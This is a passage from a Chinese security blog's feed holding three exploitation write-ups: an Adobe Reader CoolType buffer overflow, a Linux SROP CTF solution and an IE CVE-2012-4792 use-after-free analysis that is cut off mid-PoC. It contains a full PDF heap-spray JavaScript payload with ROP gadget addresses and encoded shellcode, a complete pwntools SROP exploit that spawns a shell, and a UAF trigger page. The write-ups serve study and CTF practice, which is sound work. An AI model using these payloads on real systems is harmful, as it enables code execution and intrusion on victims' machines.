spray的方法将将0x0c0c0c0c处的内存喷上自己的shellcode（这里的shellcode要伪造成用户堆栈，需要有大量的ROP以及函数调用参数组成）</li><br><li>构造相关ROP使得0x0c0c0c0c成为当前程序的堆栈来执行伪造的堆栈</li><br></ol><br><p>这里我们采用了两条ROP指令将esp指向0x0c0c0c0c</p><br><p>首先我们看一下构造的shellcode</p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702133754464?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702133925971?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>我们选取的ROP地址一个是0x4A82A714，另一个是0x4A80CB38,他们都位于icuncnv36.dll的地址空间，而在Adobe Reader的各个版本上，这个DLL两个地址不会随着改变，这也是我们选取他们的原因。</p><br><p>我们看一下他们的汇编指令 <br><br><strong>0x4A80CB38</strong> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702134555521?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br></p><br><pre class="prettyprint"><code class=" hljs avrasm">leave：<br><span class="hljs-keyword">mov</span> esp,ebp<br><span class="hljs-keyword">pop</span> ebp</code></pre><br><p>使得sp指针指向0x4A82A714，这里很巧妙的应用了该指令</p><br><hr><br><p><strong>0x4A82A714</strong> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702134642900?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>现在栈顶应该是0x0c0c0c0c这样直接pop就直接可以到rop链那 <br><br>最后成功到达rop链，这里总结一下ROP的精髓是控制esp也就是栈顶指针为你所用，其实是个栈翻转的作用，这里用了两次栈翻转，第一次没有shellcode，中间中转一下利用 第二个翻转将esp指到了shellcode的位置，这也ROP的巧妙之处吧。 <br><br>一般运用stack pivot技术的时候一句<code>xchg eax，esp</code>就能够起到作用。<br><br><br><br></p><br><hr><br><p>下面就是执行shellcode的过程了</p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702184037105?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702184053547?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>将shellcode写在可以执行的内存上，从而绕过了DEP<br></p><br><h2 id="0x4-heap-spray技术应用">0x4 heap spray技术应用</h2><br><pre class="prettyprint"><code class=" hljs autohotkey">&lt;script type=<span class="hljs-string">“text/javascript”</span>&gt;<br>var s = unescape( ‘<span class="hljs-var_expand">%u4141%</span>u4141<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u0000%</span>u4a8a<span class="hljs-var_expand">%u2196%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u903c%</span>u4a84<span class="hljs-var_expand">%ub692%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u22c8%</span>u4a85<span class="hljs-var_expand">%u0000%</span>u1000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0002%</span>u0000<span class="hljs-var_expand">%u0102%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u2db2%</span>u4a84<span class="hljs-var_expand">%u2ab1%</span>u4a80<span class="hljs-var_expand">%u0008%</span>u0000<span class="hljs-var_expand">%ua8a6%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u9038%</span>u4a84<span class="hljs-var_expand">%ub692%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%uffff%</span>uffff<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0040%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0001<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u2db2%</span>u4a84<span class="hljs-var_expand">%u2ab1%</span>u4a80<span class="hljs-var_expand">%u0008%</span>u0000<span class="hljs-var_expand">%ua8a6%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u9030%</span>u4a84<span class="hljs-var_expand">%ub692%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%uffff%</span>uffff<span class="hljs-var_expand">%u0022%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0001<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u0004%</span>u4a8a<span class="hljs-var_expand">%u2196%</span>u4a80<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u2db2%</span>u4a84<span class="hljs-var_expand">%u2ab1%</span>u4a80<span class="hljs-var_expand">%u0030%</span>u0000<span class="hljs-var_expand">%ua8a6%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u0004%</span>u4a8a<span class="hljs-var_expand">%ua7d8%</span>u4a80<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u2db2%</span>u4a84<span class="hljs-var_expand">%u2ab1%</span>u4a80<span class="hljs-var_expand">%u0020%</span>u0000<span class="hljs-var_expand">%ua8a6%</span>u4a80<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%uaedc%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u0034%</span>u0000<span class="hljs-var_expand">%ud585%</span>u4a80<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u2db2%</span>u4a84<span class="hljs-var_expand">%u2ab1%</span>u4a80<span class="hljs-var_expand">%u000a%</span>u0000<span class="hljs-var_expand">%ua8a6%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u9170%</span>u4a84<span class="hljs-var_expand">%ub692%</span>u4a80<span class="hljs-var_expand">%uffff%</span>uffff<span class="hljs-var_expand">%uffff%</span>uffff<span class="hljs-var_expand">%uffff%</span>uffff<span class="hljs-var_expand">%u1000%</span>u0000<span class="hljs-var_expand">%u91be%</span>u7e18<span class="hljs-var_expand">%udb51%</span>ud9c4<span class="hljs-var_expand">%u2474%</span>u5af4<span class="hljs-var_expand">%uc931%</span>u31b1<span class="hljs-var_expand">%u7231%</span>u0313<span class="hljs-var_expand">%u1372%</span>uea83<span class="hljs-var_expand">%ufa6d%</span>uad8b<span class="hljs-var_expand">%u7965%</span>u4e73<span class="hljs-var_expand">%u1e75%</span>uabfd<span class="hljs-var_expand">%u1e44%</span>ub899<span class="hljs-var_expand">%uaef6%</span>uede9<span class="hljs-var_expand">%u45fa%</span>u05bf<span class="hljs-var_expand">%u2889%</span>u2968<span class="hljs-var_expand">%u863a%</span>u044e<span class="hljs-var_expand">%ubbbb%</span>u07b3<span class="hljs-var_expand">%uc63f%</span>ue7e7<span class="hljs-var_expand">%u097e%</span>ue6fa<span class="hljs-var_expand">%u7447%</span>ubbf7<span class="hljs-var_expand">%uf210%</span>u2baa<span class="hljs-var_expand">%u4e15%</span>uc777<span class="hljs-var_expand">%u5e65%</span>u34ff<span class="hljs-var_expand">%u613d%</span>ueb2e<span class="hljs-var_expand">%u3836%</span>u0df0<span class="hljs-var_expand">%u309b%</span>u15b9<span class="hljs-var_expand">%u7df8%</span>uad73<span class="hljs-var_expand">%u0aca%</span>u6782<span class="hljs-var_expand">%uf203%</span>u4629<span class="hljs-var_expand">%u01ac%</span>u8e33<span class="hljs-var_expand">%ufa0a%</span>ue646<span class="hljs-var_expand">%u8769%</span>u3d50<span class="hljs-var_expand">%u5310%</span>ua6d4<span class="hljs-var_expand">%u10b2%</span>u034e<span class="hljs-var_expand">%uf443%</span>uc009<span class="hljs-var_expand">%ub14f%</span>u8e5e<span class="hljs-var_expand">%u4453%</span>ua4b2<span class="hljs-var_expand">%ucd6f%</span>u6b35<span class="hljs-var_expand">%u95e6%</span>uaf11<span class="hljs-var_expand">%u4ea3%</span>uf63b<span class="hljs-var_expand">%u2009%</span>ue844<span class="hljs-var_expand">%u9df2%</span>u62e0<span class="hljs-var_expand">%uc91e%</span>u2898<span class="hljs-var_expand">%u0c74%</span>u572e<span class="hljs-var_expand">%u0e3a%</span>u5830<span class="hljs-var_expand">%u676a%</span>ud301<span class="hljs-var_expand">%uf0e5%</span>u369e<span class="hljs-var_expand">%u0e42%</span>u1bd5<span class="hljs-var_expand">%u87e2%</span>uc9b0<span class="hljs-var_expand">%uc5b7%</span>u2442<span class="hljs-var_expand">%uf3fb%</span>ucdc0<span class="hljs-var_expand">%u0783%</span>ua7d8<span class="hljs-var_expand">%u4c86%</span>u5b5e<span class="hljs-var_expand">%uunescapefa%</span>u5b0b<span class="hljs-var_expand">%udea9%</span>u3819<span class="hljs-var_expand">%u4d2c%</span>u91c1<span class="hljs-var_expand">%uf5cb%</span>uee60’ )<span class="hljs-comment">;</span><br>var <span class="hljs-literal">a</span> = unescape( <span class="hljs-string">“%”</span> + <span class="hljs-string">“u”</span> + <span class="hljs-string">“0”</span> + <span class="hljs-string">“c”</span> + <span class="hljs-string">“0”</span> + <span class="hljs-string">“c”</span> + <span class="hljs-string">“%u”</span> + <span class="hljs-string">“0”</span> + <span class="hljs-string">“c”</span> + <span class="hljs-string">“0”</span> + <span class="hljs-string">“c”</span> )<span class="hljs-comment">;</span><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">a</span>.length + <span class="hljs-number">20</span> + <span class="hljs-number">8</span> &lt; <span class="hljs-number">65536</span>) <span class="hljs-literal">a</span>+=<span class="hljs-literal">a</span><span class="hljs-comment">;</span><br>c = <span class="hljs-literal">a</span>.substring(<span class="hljs-number">0</span>, (<span class="hljs-number">0</span>x0c0c-<span class="hljs-number">0</span>x24)/<span class="hljs-number">2</span>)<span class="hljs-comment">;</span><br>c += s<span class="hljs-comment">;</span><br>c += <span class="hljs-literal">a</span><span class="hljs-comment">;</span><br>f = c.substring(<span class="hljs-number">0</span>, <span class="hljs-number">65536</span>/<span class="hljs-number">2</span>)<span class="hljs-comment">;</span><br><span class="hljs-keyword">while</span>(f.length &lt; <span class="hljs-number">0</span>x80000) f += f<span class="hljs-comment">;</span><br>k = f.substring(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>x80000 - (<span class="hljs-number">0</span>x1020-<span class="hljs-number">0</span>x08) / <span class="hljs-number">2</span>)<span class="hljs-comment">;</span><br>var NwBg = new Array()<span class="hljs-comment">;</span><br>for (OYV=<span class="hljs-number">0</span><span class="hljs-comment">;OYV&lt;0x1f0;OYV++) NwBg[OYV]=k+”s”;</span><br>&lt;/script&gt;</code></pre><br><p>因为pdf支持javascript脚本，所以利用javascript代码进行内存喷射，将shellcode重复写到内存上</p><br><h1 id="0x03-漏洞验证">0x03 漏洞验证</h1><br><p>选用的是msf生成的poc文件，主要功能是弹出计算器，下面结合该poc文件进行相关漏洞分析预测试</p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702093146087?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>漏洞执行成功</p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Adobe Acrobat和Reader都是美国Adobe公司开发的非常流行的PDF文件阅读器。        基于Window和Mac OS X的Adobe Reader和Acrobat 9.4之前的9.x版本，8.2.5之前的8.x版本的CoolType.dll中存在基于栈的缓冲区溢出漏洞。远程攻击者可借助带有TTF字体Smart INdependent Glyphlets (SING)表格中超长字段的PDF文&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞调试" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Linux SROP 原理与攻击</title>
    <link href="http://yoursite.com/2017/06/30/Linux%20SROP%20%E5%8E%9F%E7%90%86%E4%B8%8E%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2017/06/30/Linux SROP 原理与攻击/</id>
    <published>2017-06-29T17:34:00.000Z</published>
    <updated>2017-10-22T02:14:24.999Z</updated>
    
    <content type="html"><![CDATA[<p>理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章<a href="http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。</a><br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><blockquote><br><p>理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章<a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html</a>，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。</p><br></blockquote><br><h1 id="0x01-原理">0x01 原理</h1><br><blockquote><br><p>SROP的全称是Sigreturn Oriented Programming。在这里<code>sigreturn</code>是一个系统调用，它在unix系统发生signal的时候会被间接地调用。</p><br><p>Signal这套机制在1970年代就被提出来并整合进了UNIX内核中，它在现在的操作系统中被使用的非常广泛，比如内核要杀死一个进程（<code>kill -9 $PID</code>），再比如为进程设置定时器，或者通知进程一些异常事件等等。</p><br><p>当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）。</p><br></blockquote><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630004342751?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>在这里我们主要理解sigreturn的意义是，去执行一段pop函数将堆栈中的值全部pop到寄存器中，相当于一个恢复现场的作用（攻击的时候主要运用的这一点）。</p><br><p>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例： <br><br>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code>： <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630011456220?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>我们将这段内存称为一个<code>Signal Frame</code>。<br><br><br></p><br><h1 id="0x02-攻击利用">0x02 攻击利用</h1><br><h2 id="0x1攻击流程">0x1攻击流程</h2><br><p>如果理解了前面所描述的原理，那么利用方式很简单，直接篡改在堆栈中的数据，等到sigreturn的时候就可以大展伸手了。 <br><br>攻击利用这一点 swing师傅已经写了<a href="http://bestwing.me/2017/03/20/stack-overflow-three-SROP/" target="_blank" rel="external">传送门</a><br></p><br><h2 id="0x2-题目解析">0x2 题目解析</h2><br><p>在这里我主要分析一道ctf题目，i春秋360比赛的<strong>smallest</strong> <br><br>拿到题目首先分析结构 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630012948485?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>三无产品 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630013035130?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><br></p><br><p>这里看到syscall，就想到用SROP技术</p><br><p>syscall这个指令，它是根据rax寄存器的值来查询系统调用表，并执行对应函数。 <br><br><code>syscall(rax,rdi,rsi,rdx)</code> <br><br>我们看看反汇编代码的意思 <br><br><code>syscall(0,0,$rsp,0x400)</code>，相当于调用了read函数<code>read(0,$rsp,0x400)</code><br><br><br></p><br><h3 id="1-target">1. target</h3><br><p>我们要最终获取shell权限，必须有写入<code>“/bin/bash”</code>的过程所以要用到read函数。 <br><br>要有命令执行过程所以要有exec <br><br>要有固定的字符串地址所以要有地址泄露 这里是write函数<br><br></p><br><ol><br><li>因为write函数的系统调用编号是1所以可以直接跳转绕过<code>xor ax，ax</code> <br><br>使得第二次函数执行write函数<br></li><br><li>下面需要frame结构写到栈里，但最后要调用sigreturn指令，所以这里要提前做好栈保留的工作，这里有个坑看了半天才看懂，最后的解释感觉还可以接受</li><br></ol><br><p>其他的工作倒没什么了，主要是理清思路，要知道代码中每一行是干什么的</p><br><h3 id="2write函数地址泄露">2.write函数地址泄露</h3><br><p>这里我们选用write函数的原因很简单就是因为系统调用ax=1时是write函数，所以这里选用它 <br><br>代码如下<br></p><br><pre class="prettyprint"><code class=" hljs sql">from pwn import <em><br>sh = process(“./pwn4”)<br><br><span class="hljs-operator"><span class="hljs-keyword">begin</span> = <span class="hljs-number">0x4000b0</span><br>syscall = <span class="hljs-number">0x4000be</span><br># step <span class="hljs-number">1</span> <span class="hljs-keyword">call</span> <span class="hljs-keyword">write</span> func <span class="hljs-keyword">to</span> leak stack addr<br>write_payload = p64(<span class="hljs-keyword">begin</span>) + p64(<span class="hljs-keyword">begin</span>) + p64(<span class="hljs-keyword">begin</span>) #the sec place can be replaced <span class="hljs-keyword">by</span> <span class="hljs-number">0x4000b1</span> <span class="hljs-number">0x4000b2</span> why <span class="hljs-number">3</span> addr becaus  <span class="hljs-keyword">after</span> <span class="hljs-keyword">write</span> it went <span class="hljs-keyword">to</span> <span class="hljs-keyword">read</span> func<br>sh.send(write_payload)<br><br>sh.send(<span class="hljs-string">“\xb3”</span>)#attention can <span class="hljs-keyword">only</span> send <span class="hljs-number">1</span> byte <span class="hljs-keyword">to</span> <span class="hljs-keyword">call</span> <span class="hljs-keyword">write</span> func<br>stack_addr = u64(sh.recv()[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])<br>print hex(stack_addr)<br>sh.interactive()</span></em></code></pre><br><h2 id="3构造frame结构">3.构造frame结构</h2><br><p>这一步比较简单可以直接利用别人写好的框架SigreturnFrame <br><br>首先我们要构造一个read函数，作用是把我们输入的字符串放在已经泄露的栈地址上，这一步是为了写exec的frame和参数<code>/bin/bash</code><br></p><br><pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-preprocessor">#read(0,stack_addr,0x400) </span><br>frame = SigreturnFrame(kernel=<span class="hljs-string">“amd64”</span>)<br>frame = SigreturnFrame(kernel=<span class="hljs-string">“amd64”</span>)<br>frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_read<br>frame<span class="hljs-preprocessor">.rdi</span> = <span class="hljs-number">0x0</span><br>frame<span class="hljs-preprocessor">.rsi</span> = stack_addr<span class="hljs-preprocessor">#这里和下面@值必须相同，因为是一个rop链</span><br>frame<span class="hljs-preprocessor">.rdx</span> = <span class="hljs-number">0x400</span><br>frame<span class="hljs-preprocessor">.rsp</span> = stack_addr<span class="hljs-preprocessor">#@</span><br>frame<span class="hljs-preprocessor">.rip</span> = syscall</code></pre><br><pre class="prettyprint"><code class=" hljs avrasm">frame = SigreturnFrame(kernel=<span class="hljs-string">“amd64”</span>)<br>frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_execve<br>frame<span class="hljs-preprocessor">.rdi</span> = stack_addr+<span class="hljs-number">0x300</span> <span class="hljs-preprocessor"># “/bin/sh” ‘s addr </span><br>frame<span class="hljs-preprocessor">.rip</span> = syscall</code></pre><br><h2 id="4sigreturn执行">4.sigreturn执行</h2><br><p>这里需要前面的的预留位</p><br><pre class="prettyprint"><code class=" hljs livecodeserver">goto_sigreturn_payload = p64(syscall_addr) + <span class="hljs-string">“\x00”</span>(<span class="hljs-number">15</span> - <span class="hljs-number">8</span>) <span class="hljs-comment"># sigreturn syscall is 15 </span><br>s.<span class="hljs-built_in">send</span>(goto_sigreturn_payload)</code></pre><br><p>第一个是注册ax然后rop到syscall那里去执行sigreturn，恢复现场 <br><br>下面那个和这个功能一样<br></p><br><h2 id="5完整exp">5.完整exp</h2><br><pre class="prettyprint"><code class=" hljs http"><br><br><span class="avrasm">from pwn import <em><br>sh = process(<span class="hljs-string">“./pwn4”</span>)<br>context<span class="hljs-preprocessor">.arch</span> = <span class="hljs-string">“amd64”</span><br>begin = <span class="hljs-number">0x4000b0</span><br>syscall = <span class="hljs-number">0x4000be</span><br><span class="hljs-preprocessor"># step 1 call write func to leak stack addr</span><br>write_payload = p64(begin) + p64(begin) + p64(begin) <span class="hljs-preprocessor">#the sec place can be replaced by 0x4000b1 0x4000b2 why 3 addr becaus  after write it went to read func</span><br>sh<span class="hljs-preprocessor">.send</span>(write_payload)<br><br>sh<span class="hljs-preprocessor">.send</span>(<span class="hljs-string">“\xb3”</span>)<span class="hljs-preprocessor">#attention can only send 1 byte to call write func</span><br>stack_addr = u64(sh<span class="hljs-preprocessor">.recv</span>()[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])<br>print <span class="hljs-string">“stack_addr:”</span>,hex(stack_addr)<br><br><span class="hljs-preprocessor"># step 2 create frame struct</span><br><span class="hljs-preprocessor">#read(0,stack_addr,0x400) </span><br><br>frame = SigreturnFrame(kernel=<span class="hljs-string">“amd64”</span>)<br>frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_read<br>frame<span class="hljs-preprocessor">.rdi</span> = <span class="hljs-number">0x0</span><br>frame<span class="hljs-preprocessor">.rsi</span> = stack_addr<br>frame<span class="hljs-preprocessor">.rdx</span> = <span class="hljs-number">0x400</span><br>frame<span class="hljs-preprocessor">.rsp</span> = stack_addr<br>frame<span class="hljs-preprocessor">.rip</span> = syscall<br><br>read_payload = p64(begin)+p64(<span class="hljs-number">11111</span>)+str(frame)<br>sh<span class="hljs-preprocessor">.send</span>(read_payload)<br><span class="hljs-preprocessor">#step 3 excu sigreturn </span><br>sigreturn_payload = p64(syscall)+<span class="hljs-number">7</span></em><span class="hljs-string">“\x00”</span><br>sh<span class="hljs-preprocessor">.send</span>(sigreturn_payload)<br><br><span class="hljs-preprocessor">#step 4 create frame struct</span><br>frame = SigreturnFrame(kernel=<span class="hljs-string">“amd64”</span>)<br>frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_execve<br>frame<span class="hljs-preprocessor">.rdi</span> = stack_addr+<span class="hljs-number">0x300</span><br>frame<span class="hljs-preprocessor">.rip</span> = syscall<br><br>execv_frame_payload = p64(begin) + p64(<span class="hljs-number">1111</span>) + str(frame)<br><span class="hljs-preprocessor">#step 5 excu sigreturn </span><br>execv_frame_payload_all = execv_frame_payload + (<span class="hljs-number">0x300</span> - len(execv_frame_payload))*<span class="hljs-string">“\x00”</span> + <span class="hljs-string">“/bin/sh\x00”</span><br>sh<span class="hljs-preprocessor">.send</span>(execv_frame_payload_all)<br><br>sh<span class="hljs-preprocessor">.send</span>(sigreturn_payload)<br><br>sh<span class="hljs-preprocessor">.interactive</span>()</span></code></pre></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章&lt;a href=&quot;http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。&lt;/a&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>漏洞分析之CVE-2012-4792(UAF)</title>
    <link href="http://yoursite.com/2017/06/29/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BCVE-2012-4792(UAF)/"/>
    <id>http://yoursite.com/2017/06/29/漏洞分析之CVE-2012-4792(UAF)/</id>
    <published>2017-06-28T17:04:00.000Z</published>
    <updated>2017-10-22T02:14:25.635Z</updated>
    
    <content type="html"><![CDATA[<p>0x00 漏洞简介  2012年9月，通用漏洞与披露平台发布了一个存在IE浏览器的UAF漏洞。   报告指出：Microsoft Internet Explorer 6至9版本中的mshtml.dll中的CMshtmlEd::Exec函数中存在释放后使用漏洞。远程攻击者可利用该漏洞通过特制的网站，执行任意代码。 0x01 测试环境操作系统：Windows XP sp3浏览器：IE 8.00.6<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><h1 id="0x00-漏洞简介">0x00 漏洞简介</h1><br><blockquote><br><p>2012年9月，通用漏洞与披露平台发布了一个存在IE浏览器的UAF漏洞。 <br><br>  报告指出：Microsoft Internet Explorer 6至9版本中的mshtml.dll中的CMshtmlEd::Exec函数中存在释放后使用漏洞。远程攻击者可利用该漏洞通过特制的网站，执行任意代码。 <br></p><br></blockquote><br><h1 id="0x01-测试环境">0x01 测试环境</h1><br><p>操作系统：Windows XP sp3</p><br><p>浏览器：IE 8.00.6001.18702</p><br><p>漏洞文件：mshtml 8.00.6001.18702</p><br><p>调试器：windbg  x86</p><br><p>利用windbg辅助工具设置系统堆栈调试功能</p><br><pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-label">C:</span>\Documents <span class="hljs-keyword">and</span> Settings\Administrator&gt;gflags<span class="hljs-preprocessor">.exe</span> -I iexplore<span class="hljs-preprocessor">.exe</span> +hpa +ust<br>Current Registry Settings for iexplore<span class="hljs-preprocessor">.exe</span> executable are: <span class="hljs-number">02001000</span><br>    ust - Create user mode stack trace database<br>    hpa - Enable page heap</code></pre><br><h1 id="0x02-漏洞验证">0x02 漏洞验证</h1><br><p>首先给出一段简单的poc验证CVE漏洞</p><br><pre class="prettyprint"><code class=" hljs xml"><span class="hljs-doctype">&lt;!doctype html&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="javascript"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span><span class="hljs-params">()</span><br>{</span><br>     <span class="hljs-keyword">var</span> e0 = <span class="hljs-literal">null</span>;<br>     <span class="hljs-keyword">var</span> e1 = <span class="hljs-literal">null</span>;<br>     <span class="hljs-keyword">var</span> e2 = <span class="hljs-literal">null</span>;<br>     <span class="hljs-keyword">try</span> {<br>          e0 = document.getElementById(<span class="hljs-string">“a”</span>);<br>          e1 = document.createElement(<span class="hljs-string">“div”</span>);<br>          e2 = document.createElement(<span class="hljs-string">“q”</span>);<br>          e1.applyElement(e2);<br>          e1.appendChild(document.createElement(<span class="hljs-string">‘button’</span>));<br>          e1.applyElement(e0);<br>          e2.innerHTML = <span class="hljs-string">“”</span>;<br>          e2.appendChild(document.createElement(<span class="hljs-string">‘body’</span>));<br>     } <span class="hljs-keyword">catch</span>(e) { }<br>     CollectGarbage();<br>}<br></span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">body</span> <span class="hljs-attribute">onload</span>=<span 